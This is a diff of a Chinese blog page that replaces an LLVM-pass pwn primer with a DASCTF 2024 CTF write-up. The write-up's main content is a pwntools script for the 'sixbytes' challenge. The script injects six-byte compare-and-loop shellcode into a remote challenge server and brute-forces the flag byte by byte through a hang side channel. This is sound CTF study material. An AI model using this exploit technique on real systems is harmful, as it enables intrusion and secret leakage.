@@ -16,25 +16,23 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="了解LLVMLLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本 LLVM PASSpass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化或者对代码插桩等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果  首">
+    <meta name="description" content="2024-10-19 18:14 PWN  sixbytes  usersys (复现)  ChromeLogger (复现)  sixbytes6个字节的shellcode 最开始爆3不出来, 后面调试了下可以发现是因为idx为和不为0的时候跳转的循环地址不同, 直接跳过flag头开爆 1234567891011121314151617181920212223242526272829303132">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LLVM_Zero">
-<meta property="og:url" content="http://lekclc.github.io/2024/07/14/llvm_zero/index.html">
+<meta property="og:title" content="PWN DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章">
+<meta property="og:url" content="http://lekclc.github.io/2024/10/20/DASCTF%202024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%EF%BD%9C%E7%A7%8B%E6%84%8F%E6%B5%93%EF%BC%8C%E6%88%98%E7%81%AB%E7%87%83%EF%BC%8C%E7%A0%81%E4%B8%8A%E8%A7%81%E7%9C%9F%E7%AB%A0/index.html">
 <meta property="og:site_name" content="ymixz">
-<meta property="og:description" content="了解LLVMLLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本 LLVM PASSpass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化或者对代码插桩等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果  首">
+<meta property="og:description" content="2024-10-19 18:14 PWN  sixbytes  usersys (复现)  ChromeLogger (复现)  sixbytes6个字节的shellcode 最开始爆3不出来, 后面调试了下可以发现是因为idx为和不为0的时候跳转的循环地址不同, 直接跳过flag头开爆 1234567891011121314151617181920212223242526272829303132">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic.ymixz.top/2024/08/926acdbfb0658a2ec46947903efc0cb4.webp">
-<meta property="article:published_time" content="2024-07-14T04:43:26.000Z">
-<meta property="article:modified_time" content="2024-10-17T10:20:02.727Z">
+<meta property="article:published_time" content="2024-10-20T04:51:00.000Z">
+<meta property="article:modified_time" content="2024-10-20T04:52:19.013Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="llvm">
+<meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic.ymixz.top/2024/08/926acdbfb0658a2ec46947903efc0cb4.webp">
   
   
   
-  <title>LLVM_Zero - ymixz</title>
+  <title>PWN DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章 - ymixz</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="LLVM_Zero"></span>
+            <span id="subtitle" data-typed-text="PWN DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章"></span>
           
         </div>
 
@@ -211,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-14 12:43" pubdate>
-          2024年7月14日 下午
+        <time datetime="2024-10-20 12:51" pubdate>
+          2024年10月20日 下午
         </time>
       </span>
     
@@ -223,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          2.2k 字
         
       </span>
     
@@ -234,7 +232,7 @@
         
         
         
-          15 分钟
+          19 分钟
         
       </span>
     
@@ -271,42 +269,22 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">LLVM_Zero</h1>
+            <h1 id="seo-header">PWN DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h1><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>LLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本</p>
-<h2 id="LLVM-PASS"><a href="#LLVM-PASS" class="headerlink" title="LLVM PASS"></a>LLVM PASS</h2><p>pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化或者对代码插桩等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果</p>
-<p><img src="https://pic.ymixz.top/2024/08/926acdbfb0658a2ec46947903efc0cb4.webp" srcset="/(https://pic.ymixz.top/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240710231338721"></p>
-<p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，IR连接这编译器的前端和后端</p>
-<p>LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口</p>
-<p>通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能</p>
-<p>LLVM的IR有三种表示形式：</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">			内存格式，只保存在内存中，人无法看到。<br>.<span class="hljs-keyword">bc </span>格式		不可读的IR，被称作<span class="hljs-keyword">bitcode，文件后缀为bc。</span><br><span class="hljs-keyword"></span>.<span class="hljs-keyword">ll </span>格式		可读的IR，介于高级语言和汇编代码之间，文件后缀为<span class="hljs-keyword">ll。</span><br></code></pre></td></tr></table></figure>
+                <p>2024-10-19 18:14</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul>
+<li><input checked="" disabled="" type="checkbox"> sixbytes</li>
+<li><input disabled="" type="checkbox"> usersys (复现)</li>
+<li><input disabled="" type="checkbox"> ChromeLogger (复现)</li>
+</ul>
+<h2 id="sixbytes"><a href="#sixbytes" class="headerlink" title="sixbytes"></a>sixbytes</h2><p>6个字节的shellcode</p>
+<p>最开始爆3不出来, 后面调试了下可以发现是因为idx为和不为0的时候跳转的循环地址不同, 直接跳过flag头开爆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>  <br><br>io_ch=<span class="hljs-number">0</span><br><br>de_bug=<span class="hljs-number">0</span><br><br>url=<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span><br><br>port=<span class="hljs-number">25036</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br><br>    io=remote(url,port)<br><br><span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br><br>    io=process(filename)<br><br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br><br>        gdb.attach(io)<br><br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br><br>    elf=ELF(filename)<br><br>    <span class="hljs-comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br><br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br><br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br><br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br><br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br><br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br><br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>r_l.srand(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmp byte ptr [rdi+&#123;&#125;],&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">ja $-0x4</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>  <br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>(<span class="hljs-params">i,j</span>):<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br><br>    sl(asm(shellcode.<span class="hljs-built_in">format</span>(i,j)))<br><br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br><br>    idx = <span class="hljs-number">5</span><br><br>    l = <span class="hljs-number">0x20</span><br><br>    r = <span class="hljs-number">0x80</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><br>        sleep(<span class="hljs-number">0.5</span>)<br><br>        mid = (l + r) // <span class="hljs-number">2</span><br><br>        <span class="hljs-built_in">print</span>(l,mid,r)<br><br>        io=remote(url,port)<br><br>        <span class="hljs-keyword">try</span>:<br><br>            pwn_exp(idx, mid)<br><br>            io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,timeout=<span class="hljs-number">1</span>)<br><br>            <span class="hljs-comment">#小于</span><br><br>            l = mid+<span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DDD&quot;</span>)<br><br>            io.close()<br><br>        <span class="hljs-keyword">except</span>:<br><br>            <span class="hljs-comment">#等于大于</span><br><br>            r = mid<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EEE&quot;</span>)<br><br>            io.close()<br><br>        <span class="hljs-keyword">if</span> l == r:<br><br>            flag += <span class="hljs-built_in">chr</span>(l)<br><br>            idx += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(l) == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><br>                <span class="hljs-built_in">print</span>(flag)<br><br>                exit()<br><br>            l = <span class="hljs-number">0x20</span><br><br>            r = <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>
 
-<p>就是说，LLLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力</p>
-<p>LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞</p>
-<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>.ll格式和.bc格式生成及相互转换的常用指令清单</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.c</span> -&gt; .ll：clang -emit-llvm -S <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.ll</span><br><span class="hljs-selector-class">.c</span> -&gt; <span class="hljs-selector-class">.bc</span>: clang -emit-llvm -c <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.bc</span><br><span class="hljs-selector-class">.ll</span> -&gt; <span class="hljs-selector-class">.bc</span>: llvm-as <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.ll</span> -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.bc</span><br><span class="hljs-selector-class">.bc</span> -&gt; <span class="hljs-selector-class">.ll</span>: llvm-dis <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.bc</span> -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.ll</span><br><span class="hljs-selector-class">.bc</span> -&gt; <span class="hljs-selector-class">.s</span>: llc <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.bc</span> -o <span class="hljs-selector-tag">a</span>.s<br></code></pre></td></tr></table></figure>
 
-<p>安装clang及LLVM</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> apt install clang-<span class="hljs-number">12</span><br><span class="hljs-attribute">sudo</span> apt install llvm-<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>
-
-<p> opt是LLVM的优化器和分析器，可加载指定的模块，对输入的LLVM IR或者LLVM字节码进行优化或分析。CTF题目一般会给出所需版本的opt 文件（可用./opt –version查看版本）或者在README文档中告知opt版本。安装好llvm后，可在/usr/lib/llvm-xx/bin/opt路径下找到对应 llvm版本的opt文件（一般没有PIE保护）</p>
-<p>最好使用题目所给opt同版本的clang生成ll或bc文件</p>
-<p>LLVM PASS类题目都会给出一个xxx.so (自定义的LLVM PASS模块) ，漏洞点就自然在其中。可以使用opt -load ./xxx.so -xxx ./exp.{ll/bc} 加载模块并启动LLVM的优化分析（其中-xxx是xxx.so中注册的PASS的名称，README文档中一般会给出，也可以通过逆向 PASS模块得到）。若题目给了opt文件，那么要用题目指定的opt文件启动LLVM并调试</p>
-<p>在打远程的时候，与内核和QEMU逃逸的题类似：将exp.ll或exp.bc通过base64加密传输到远程服务器，远程服务器会解码，并将得到的 LLVM IR传给LLVM运行</p>
-<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><p>找到runOnFunction函数时如何重写的，一般来说runOnFunction都会在函数表最下面,找PASS注册的名称，一般会在README文件中给出，若是没有给出，可通过对__cxa_atexit函数”交叉引用”来定位</p>
-<p>通过逆向，找到函数名及参数，编写基本exp</p>
-<p>找到漏洞，写利用exp.c，其中的pwn的目标是opt文件，查看保护和找gadget都在opt中找</p>
-<p>生成.ll文件</p>
-<p>将.ll文件输入到LLVM中</p>
-<p>用下面的命令可以生成.ll文件准备输入到LLVM中：</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">clang -emit-llvm -S <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span>.ll<br></code></pre></td></tr></table></figure>
-
-<p>最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加&gt;[文件名]来获取：</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">opt -<span class="hljs-built_in">load</span> ./LLVMFirst.so -hello ./<span class="hljs-built_in">exp</span>.ll<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -341,7 +319,7 @@
       
         <a href="/tags/pwn/" class="print-no-link">#pwn</a>
       
-        <a href="/tags/llvm/" class="print-no-link">#llvm</a>
+        <a href="/tags/buu/" class="print-no-link">#buu</a>
       
     </div>
   
@@ -355,9 +333,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/17/llvm_one/" title="LLVM_One">
+                      <a href="/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024/" title="强网拟态2024">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">LLVM_One</span>
+                        <span class="hidden-mobile">强网拟态2024</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -365,8 +343,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/13/protobuf/" title="protobuf">
-                        <span class="hidden-mobile">protobuf</span>
+                      <a href="/2024/09/03/ycd2024/" title="羊城杯 2024">
+                        <span class="hidden-mobile">羊城杯 2024</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
